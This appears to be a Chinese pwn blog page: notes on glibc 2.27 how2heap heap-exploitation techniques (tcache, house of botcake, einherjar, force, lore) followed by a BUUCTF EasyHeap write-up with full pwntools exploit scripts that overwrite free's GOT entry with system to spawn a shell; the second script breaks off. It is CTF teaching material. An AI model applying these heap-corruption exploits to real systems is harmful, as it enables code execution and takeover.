<h1 id="1-fastbin-dup"><a href="#1-fastbin-dup" class="headerlink" title="1. fastbin_dup"></a>1. fastbin_dup</h1><p>熟悉的味道。double free嘛。不过首先将tcache对应的cache填满了。不再赘述。</p>
<h1 id="2-fastbin-reverse-into-tcache"><a href="#2-fastbin-reverse-into-tcache" class="headerlink" title="2. fastbin_reverse_into_tcache"></a>2. fastbin_reverse_into_tcache</h1><p>看标题应该和tcache有关，仔细看一下。</p>
<p>首先就分配了14个0x50大小的chunk，然后释放7个填满了tcache，再释放7个填满了fastbin。在栈区分配了6个8字节空间，初始化为全0xcd。之后漏洞关键步骤：将第8个free掉的chunk（即第1个被放入fastbin的chunk）的fd修改为栈区这6个8字节空间的开头。<font color=red>记住：第8个被释放的chunk在fastbins的尾部，fastbin是<strong>链栈结构</strong>。</font></p>
<p>之后，将tcache分配完清空。然后注意：再malloc一次会将所有fastbin chunks转到tcache中，而且是和fastbin逆序的关系链入tcache。</p>
<p>这是malloc之前的bins：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">tcachebins</span><br><span class="line">empty</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x555555757660 —▸ 0x555555757610 —▸ 0x5555557575c0 —▸ 0x555555757570 —▸ 0x555555757520 ◂— ...</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure>

<p>这是malloc之后的bins：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">tcachebins</span><br><span class="line">0x50 [  7]: 0x7fffffffe180 —▸ 0x555555757490 —▸ 0x5555557574e0 —▸ 0x555555757530 —▸ 0x555555757580 —▸ 0x5555557575d0 —▸ 0x555555757620 ◂— 0x0</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0xcdcdcdcdcdcdcdcd</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure>

<p>从前后的变化我们可以大胆猜测这一步进行了什么操作：</p>
<p>由于malloc之前tcache没有chunk，所以_int_malloc只能从fastbin中查找。查找到合适的chunk之后，会将这个chunk记录下来留作之后返回。但是并不是立即返回，_int_malloc发现fastbin后面还有chunk，于是从头指针不断弹出chunk到tcache的头指针。如此操作之后原来fastbin中的chunk到了tcache的顺序就反过来了。因为一个fastbin最多有7个chunk。那么_int_malloc函数应该会循环7次退出，或者是检查到chunk的fd指针为0时退出（这个chunk就是fastbin中最后一个chunk了）。在malloc之后，fastbin中还剩下6个chunk。在弹出这6个chunk之后，libc发现了我们修改的fd指针，此时fastbin的指针指向栈区，于是libc顺理成章地将这个栈区的指针也链入到了tcache中，并放在tcache的头部，然后不加检查地就退出了。此时，fastbin中却只剩下了一地鸡毛：一个我们在初始化栈区时嵌入的无效的指针值（0xcdcdcdcdcdcdcdcd）。在栈区指针链入之后，栈区中的值实际上就已经发生了改变，fd指针的地方变成了后面一个chunk的地址，bk指针的地方应该是被修改为了tcache结构体位置的地址（因为tcache中后面的chunk在bk处设置的值是相等的）。然后，我们只要再进行一次malloc就能够获得一个栈上面的地址了。</p>
<p>查看源代码之后，验证了我们的猜想。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">&#123;</span><br><span class="line">  mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* While bin not empty and tcache not full, copy chunks.  */</span></span><br><span class="line">  <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">	 &amp;&amp; (tc_victim = *fb) != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">	*fb = tc_victim-&gt;fd;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">	  REMOVE_FB (fb, pp, tc_victim);</span><br><span class="line">	  <span class="keyword">if</span> (__glibc_unlikely (tc_victim == <span class="literal">NULL</span>))</span><br><span class="line">	    <span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">      tcache_put (tc_victim, tc_idx);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> REMOVE_FB(fb, victim, pp)			\</span></span><br><span class="line"><span class="meta">  do							\</span></span><br><span class="line"><span class="meta">    &#123;							\</span></span><br><span class="line"><span class="meta">      victim = pp;					\</span></span><br><span class="line"><span class="meta">      <span class="keyword">if</span> (victim == NULL)				\</span></span><br><span class="line"><span class="meta">	break;						\</span></span><br><span class="line"><span class="meta">    &#125;							\</span></span><br><span class="line"><span class="meta">  while ((pp = catomic_compare_and_exchange_val_acq (fb, victim-&gt;fd, victim)) \</span></span><br><span class="line"><span class="meta">	 != victim);</span></span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">define</span> TCACHE_FILL_COUNT 7</span></span><br><span class="line">......</span><br><span class="line">tcache_count = TCACHE_FILL_COUNT,</span><br></pre></td></tr></table></figure>

<p>while语句就是将fastbin chunk移至tcache中，其中<code>REMOVE_FB</code>函数就是取出fastbin的第一个chunk链入到对应tcache头。后面检查fastbin里面是否还有chunk，没有则退出。</p>
<p>在源代码中，还考虑了当fastbin中的chunk数量少于7个的情况。如果fastbin没有被填满，则在链入栈区的地址后，_int_malloc还会继续检查栈区这个假chunk的fd是否为0，如果是一个无效值就会导致程序崩溃。但如果是0的话也是可以达到上面的效果，将栈区地址链入到tcache头的。但是栈区的不稳定性与可重用性决定了其在未初始化时的值不确定，所以fastbin没有填满时进行malloc有一定的风险，不一定能够成功。</p>
<p>理解本漏洞利用方式需要理解fastbin和tcache的交互过程，实际上也比较容易理解。既然glibc决定添加tcache，就要让其发挥最大限度的作用——成为一个比fastbin还要fast的堆块分配模块，所以这种情况下肯定是要让fastbin里面的chunk尽可能往tcache里面塞。又考虑到fast的性质，在tcache不空的时候不会触发这个过程。</p>
<h1 id="3-house-of-botcake"><a href="#3-house-of-botcake" class="headerlink" title="3. house_of_botcake"></a>3. house_of_botcake</h1><p>这是一种通过tcache进行的漏洞利用方法，能够让malloc返回任意地址值。</p>
<p>首先在栈区分配0x20空间，这是之后malloc要返回的地址。之后分配9个0x110的chunk，外加一个小chunk防止top chunk合并。然后释放前7个chunk填满tcache。然后先释放第9个再释放第8个chunk，这样释放完之后这两个chunk因为同在unsorted bin中，所以会合并。后面分配一个chunk出来，这个chunk当然是从tcache中获取（第7个chunk）。获取之后再次释放第9个chunk，此时第9个chunk被放到了tcache中，也即第9个chunk被double free，导致重叠了。</p>
<p>之后呢，分配一个0x130的chunk，这当然会从由第8和9个chunk合并产生的unsorted bin chunk中切割一个chunk分过去。到这里，你的眼里是否有光？我们可以通过这个chunk修改第9个chunk的指针，而这个chunk现在就在tcache的头部！我们将第9个chunk的fd指针修改为栈区我们想要的地址之后，tcache就断链了，此时tcache头部是第9个chunk，后面连着的就是我们想分配的地址。因此后面malloc两次即可。</p>
<p>理解本漏洞利用方法的核心在于理解堆块的重叠。堆块重叠的目的是修改tcache使其最终指向我们想要的地址，这只是一种我们修改tcache的手段而已。tcache不会检查double free。当一个chunk被double free到不同的bin时，杀伤力是最大的，因为这不可能会被检查到。glibc 2.23中的第二个源码好像也是将chunk两次free到不同的bin中。</p>
<h1 id="4-house-of-einherjar"><a href="#4-house-of-einherjar" class="headerlink" title="4. house_of_einherjar"></a>4. house_of_einherjar</h1><p>这个漏洞利用在glibc 2.23中有分析，是一种poison null byte漏洞利用方式。还是看一下和2.23有没有什么不同之处。</p>
<p>首先分配0x40的chunk(name: a)，然后在栈构造一个假chunk，prev size和size均为0x100，fd、bk、fd_nextsize和bk_nextsize均设为其本身。之后分配0x500的chunk(name: b)，这样b的size本来应为0x501。之后，漏洞关键步骤：a溢出一个空字节到b使得b的size变为0x500。然后调整a的prev size使得后面堆块合并的时候能够让堆块头到达想要分配的栈区地址。这里a的prev size应设为b - fake chunk，作为呼应，栈区的size也应该修改为这个值。然后将b释放即可得到一个位于栈区的堆块指针。这样看起来和2.23的没有什么不同，只是因为有tcache的存在，所以需要释放的b应该要比较大才行，大于tcache中链入chunk的最大size即可。</p>
<h1 id="5-house-of-force"><a href="#5-house-of-force" class="headerlink" title="5. house_of_force"></a>5. house_of_force</h1><p>这个漏洞利用在glibc 2.23中有分析。</p>
<p>源码中想要在bss段的地方进行写操作。首先分配0x110的chunk(name: p1)，然后修改top chunk的大小到最大，再分配一个很大的chunk使top chunk到达要写的地方的正下方，然后再分配一个chunk就能在bss段写了。这个利用方式与2.23没有区别，不再赘述。</p>
<h1 id="6-house-of-lore"><a href="#6-house-of-lore" class="headerlink" title="6. house_of_lore"></a>6. house_of_lore</h1><p>这是一种利用small bins的攻击手段，由于glibc 2.27中tcache的影响，具体的利用方式可能会和2.23有所区别。</p>
<p>和2.23相比，2.27的house_of_lore利用需要绕过更加严格的检查。</p>
<p><strong>Step 1: 分配8个0x110的chunk，在栈区开8*7大小的空间，其中包括0x20大小的一块（stack_buffer_1）和0x18大小的一块（stack_buffer_2）。另在栈区开7*4的指针数组。</strong></p>
<p>第1个会成为漏洞利用的对象，而2~8个用于后面填充tcache。</p>
<p><strong>Step 2: 构造栈区，将stack_buffer_1和stack_buffer_2构造为两个假的chunk，将指针数组构造为一个假的free list。</strong></p>
<p>在源码中，我们应该将指针数组的每一个0x20的空间看做是一个chunk，程序所做的就是为每一个假chunk的bk指针赋值使得前一个chunk的bk指向后一个chunk（最后一个chunk不赋值）。之后，将stack_buffer_1的fd指针对应偏移处指向Step 1中分配的第一个chunk，size和prev size均设为0，bk指针对应偏移处指向stack_buffer_2；将stack_buffer_2的fd指针对应偏移处指向stack_buffer_1，bk对应偏移处指向指针数组开头。如图所示。将栈区如此构造主要是为了绕过libc的检查，后面会有所解释。</p>
<p><img src="https://img-blog.csdnimg.cn/3de7a924c8704c7d88de38d665411f93.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATDNIX0NvTGlu,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center"></p>
<p><strong>Step 3: 分配0x1010的chunk消除top chunk的影响。释放2~8个chunk以填满tcache。</strong></p>
<p><strong>Step 4: 释放第一个chunk，它会被链入到unsorted bin中。</strong></p>
<p><strong>Step 5: 分配一个大chunk（0x1210），让第一个chunk进入small bins</strong></p>
<p>0x1210大小的chunk无法被small bins和unsorted bin处理，因此在_int_malloc函数中会在遍历的过程将第一个chunk链入到small bins中。</p>
<p><font color=red><strong>Step 6: 覆写第一个chunk的bk指针。</strong></font></p>
<p>这一步和2.23中相同，将第一个chunk的bk指针改成了stack_buffer_1的栈区地址。</p>
<p><strong>Step 7: 将tcache清空。</strong></p>
<p>将tcache清空的原因是遍历small bins时malloc会将符合大小的chunk链入到tcache中而且是逆向链入，与fastbin_reverse_into_tcache中的过程相似。这是为后面做准备。</p>
<p><strong>step 8: 分配出第一个chunk。</strong></p>
<p>注意：将第一个chunk分配出来之后，malloc会将我们在栈区构造的7个假chunk逆向链入到tcache中。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">tcachebins</span><br><span class="line">0x110 [  7]: 0x7fffffffe1e0 —▸ 0x7fffffffe1c0 —▸ 0x7fffffffe1a0 —▸ 0x7fffffffe180 —▸ 0x7fffffffe160 —▸ 0x7fffffffe0e0 —▸ 0x7fffffffe100 ◂— 0x0</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">0x110 [corrupted]</span><br><span class="line">FD: 0x555555757250 —▸ 0x7ffff7dcdda0 (main_arena+352) ◂— 0x555555757250 /* &#x27;PruUUU&#x27; */</span><br><span class="line">BK: 0x7fffffffe1f1 ◂— 0x4000007fffffffe2</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure>

<p>在libc源码中有下面这一段，构造stack_buffer_1就是为了绕过这个检查：<code>bck-&gt;fd == victim</code>。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[ ... ]</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      bck = victim-&gt;bk;</span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))&#123;</span><br><span class="line"></span><br><span class="line">                  errstr = <span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>;</span><br><span class="line">                  <span class="keyword">goto</span> errout;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">       set_inuse_bit_at_offset (victim, nb);</span><br><span class="line">       bin-&gt;bk = bck;</span><br><span class="line">       bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">       [ ... ]</span><br></pre></td></tr></table></figure>

<p><strong>Step 9: 再分配出一个chunk，这个chunk的地址就在栈区。</strong></p>
<p>由上面的bin分布可知，这个chunk的地址在0x7fffffffe1e0，妥妥的栈区。</p>
<p><strong>Step 10: 利用这个栈上的地址修改main函数返回地址。</strong></p>
<p>这里源代码的执行出现了错误，因为写入的偏移不对，修改偏移到0x68即可绕过canary直接修改返回地址。这里作者可能是误以为tcache中的第一个chunk是预先分配的7个假chunk的最后一个，如果是的话偏移为40就是正确的。但实际上这里是第5个chunk，因为有stack_buffer_1和stack_buffer_2在前，tcache中的结构应该是：</p>
<p><code>5th stack fake chunk -&gt; 4th -&gt; 3rd -&gt; 2nd -&gt; 1st -&gt; stack_buffer_2 -&gt; stack_buffer_1</code></p>
<p>这里不知道为什么作者没有注意到这个错误。</p>
<p>可以看到，2.27的house_of_lore和2.23还是有很大区别的，利用tcache的特性将假chunk链入到tcache中再分配以修改栈区内容。通过fastbin_reverse_into_tcache和house_of_lore我们可以发现，在malloc小块内存时，如果tcache中没有chunk而对应small bins或fastbin有，则会将这些chunk尽可能往tcache塞，顺序是先fastbin后small bins。</p>
<p>将small bins中的chunk链入到tcache的libc源码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">&#123;</span><br><span class="line">      mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* While bin not empty and tcache not full, copy chunks over.  */</span></span><br><span class="line">      <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">	     &amp;&amp; (tc_victim = last (bin)) != bin)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="keyword">if</span> (tc_victim != <span class="number">0</span>)</span><br><span class="line">	    &#123;</span><br><span class="line">	      bck = tc_victim-&gt;bk;</span><br><span class="line">	      set_inuse_bit_at_offset (tc_victim, nb);</span><br><span class="line">	      <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">		set_non_main_arena (tc_victim);</span><br><span class="line">	      bin-&gt;bk = bck;</span><br><span class="line">	      bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">	      tcache_put (tc_victim, tc_idx);</span><br><span class="line">            &#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/02/28/buuctf-pwn-write-ups-5/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's Pwnhome">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/02/28/buuctf-pwn-write-ups-5/" class="post-title-link" itemprop="url">buuctf-pwn write-ups (5)</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-02-28 22:28:04" itemprop="dateCreated datePublished" datetime="2023-02-28T22:28:04+08:00">2023-02-28</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="buu039-ZJCTF-2019-EasyHeap"><a href="#buu039-ZJCTF-2019-EasyHeap" class="headerlink" title="buu039-[ZJCTF 2019]EasyHeap"></a>buu039-[ZJCTF 2019]EasyHeap</h1><p>一道堆题，经典的菜单，创建chunk（最多10个），编辑chunk（可以有任意长度的堆溢出），删除chunk（没有悬挂指针）。因此本题考察堆溢出。</p>
<p>由于本题环境在2.23，因此可以使用的堆漏洞方式比更高版本的更多。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( choice == <span class="number">4869</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int64)magic &lt;= <span class="number">0x1305</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;So sad !&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Congrt !&quot;</span>);</span><br><span class="line">    l33t();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>题目里面有这么一段，应该是只要能够把地址magic的位置修改成大于0x1305，然后选项填4869就能getshell。</p>
<p><strong>方法1：fastbin attack</strong><br>这应该是最简单的方法了。分配一些小的chunk，然后通过堆溢出直接修改chunk的fd指针。这个时候需要绕过一个检查：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (fastbin_index (chunksize (victim)) != idx, <span class="number">0</span>))</span><br><span class="line">            &#123;</span><br><span class="line">              errstr = <span class="string">&quot;malloc(): memory corruption (fast)&quot;</span>;</span><br><span class="line">            errout:</span><br><span class="line">              malloc_printerr (check_action, errstr, chunk2mem (victim), av);</span><br><span class="line">              <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>
<p>也就是会检查fastbin的chunk的size是否正确。我们可以错位分配fastbin chunk到bss段中的heaparray中，以实现对写入地址的完全控制。</p>
<p><img src="https://img-blog.csdnimg.cn/07586aced18e4f8d9fd46383e318065e.png"><br>分配之后，heaparray[2]应该是0x6020B5-0x8的地址。修改magic之后调用l33t函数，但是发现没有这个文件。好家伙玩我是吧……</p>
<p>但是还有其他方法。我们现在控制了bss段，可以随意修改heaparray，从而实现任一地址任意长度写。因此可以修改got表，把exit或malloc等函数改成system的plt地址即可，但是由于要传入参数，所以考虑修改free.got。</p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./easyheap&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./easyheap&#x27;</span>)</span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">28974</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">size, content</span>):</span><br><span class="line">	io.sendlineafter(<span class="string">b&#x27;Your choice :&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">	io.sendlineafter(<span class="string">b&#x27;Size of Heap : &#x27;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line">	io.sendlineafter(<span class="string">b&#x27;Content of heap:&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, size, content</span>):</span><br><span class="line">	io.sendlineafter(<span class="string">b&#x27;Your choice :&#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">	io.sendlineafter(<span class="string">b&#x27;Index :&#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line">	io.sendlineafter(<span class="string">b&#x27;Size of Heap : &#x27;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line">	io.sendlineafter(<span class="string">b&#x27;Content of heap :&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">	io.sendlineafter(<span class="string">b&#x27;Your choice :&#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">	io.sendlineafter(<span class="string">b&#x27;Index :&#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x40</span>, <span class="string">b&#x27;colin&#x27;</span>)		<span class="comment"># chunk #0</span></span><br><span class="line">create(<span class="number">0x60</span>, <span class="string">b&#x27;colin&#x27;</span>)		<span class="comment"># chunk #1</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">0</span>, <span class="number">0x100</span>, cyclic(<span class="number">0x40</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>) + p64(<span class="number">0x6020B5</span> - <span class="number">8</span>))	<span class="comment"># overflow chunk #1</span></span><br><span class="line">create(<span class="number">0x60</span>, <span class="string">b&#x27;colin&#x27;</span>)	<span class="comment"># new chunk #1</span></span><br><span class="line">create(<span class="number">0x60</span>, <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">3</span> + p64(<span class="number">0</span>) * <span class="number">4</span> + p64(elf.got[<span class="string">&#x27;free&#x27;</span>]))	<span class="comment"># alloc chunk in bss, overflow chunk #0</span></span><br><span class="line">edit(<span class="number">0</span>, <span class="number">0x8</span>, p64(elf.plt[<span class="string">&#x27;system&#x27;</span>]))		<span class="comment"># edit free().got to system().plt</span></span><br><span class="line">create(<span class="number">0x60</span>, <span class="string">b&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">delete(<span class="number">3</span>)	<span class="comment"># system(&#x27;/bin/sh&#x27;)</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p><strong>方法2：unlink</strong><br>通过使用unsorted bin的unlink操作控制heaparray数组，也是一种可行的方法。具体的实现原理请参考我的how2heap系列第5、8篇文章，本题的实现原理与how2heap中unlink的演示高度相似。</p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./easyheap&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./easyheap&#x27;</span>)</span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">28974</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">size, content</span>):</span><br><span class="line">	io.sendlineafter(<span class="string">b&#x27;Your choice :&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">	io.sendlineafter(<span class="string">b&#x27;Size of Heap : &#x27;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line">	io.sendlineafter(<span class="string">b&#x27;Content of heap:&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span 